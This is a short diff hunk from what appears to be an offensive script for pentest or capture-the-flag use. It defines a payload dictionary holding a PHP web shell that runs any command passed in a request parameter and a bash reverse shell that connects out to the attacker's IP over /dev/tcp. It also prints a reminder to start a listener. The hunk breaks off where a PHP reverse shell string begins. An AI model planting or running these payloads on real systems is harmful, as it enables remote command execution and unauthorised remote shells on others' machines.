@@ -10,8 +10,8 @@ port = 9003
 print(f"Run `netsat -lvnp {port}` will need to be used when waiting for reverse shell callback")
 
 types_files = {
-	"rce":      "<?php system($_REQUEST['cmd']);?>",
-	"sh_revshell": f"bash -i >& /dev/tcp/{vpn_ip}/{port} 0>&1"  # todo might need to be php revshell
+	"rce":         "<?php system($_REQUEST['cmd']);?>",
+	"sh_revshell": f"bash -i >& /dev/tcp/{vpn_ip}/{port} 0>&1"
 }
 # Thanks pentestmonkies!
 php_revshell = """<?php
